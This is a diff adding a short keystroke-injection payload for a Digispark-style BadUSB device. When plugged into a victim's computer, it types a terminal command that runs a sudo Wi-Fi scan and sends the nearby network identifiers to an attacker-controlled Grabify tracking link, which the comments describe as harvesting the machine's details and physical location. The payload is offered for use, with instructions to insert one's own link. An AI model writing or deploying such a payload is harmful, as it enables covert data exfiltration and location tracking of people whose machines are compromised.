@@ -1,0 +1,5 @@
+// Harvests the IP address and system details of a computer as well as deriving its physical location
+// Payload to scan for nearby Wi-Fi networks and send their MAC address to an attacker via a Grabify link
+// Replace with your Grabify link to be effective, enter into terminal window
+
+DigiKeyboard.print("curl --silent --output /dev/null --referer \"$(sudo iw dev wlan0 scan | grep wlan0 | sed 1d | xargs | tr -d ' ' | tr -d '-')\' https://grabify.link/LINK");
